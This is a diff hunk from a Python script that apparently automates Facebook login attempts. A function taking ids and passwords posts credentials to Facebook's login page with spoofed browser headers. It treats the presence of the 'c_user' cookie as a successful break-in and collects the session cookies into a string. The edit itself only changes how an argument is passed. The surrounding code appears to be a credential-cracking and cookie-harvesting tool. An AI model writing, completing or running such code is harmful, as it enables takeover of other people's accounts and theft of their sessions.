@@ -345,7 +345,7 @@ def _M1_(ids,pasx):
                         'accept-encoding': 'gzip, deflate, br',
                         'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
                         url=f"https://www.facebook.com/login.php/?login_attempt=1&display=popup"
-                        lo = session.post(url,data=info,headers=had).text
+                        lo = session.post(url=url,data=info,headers=had).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
                                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
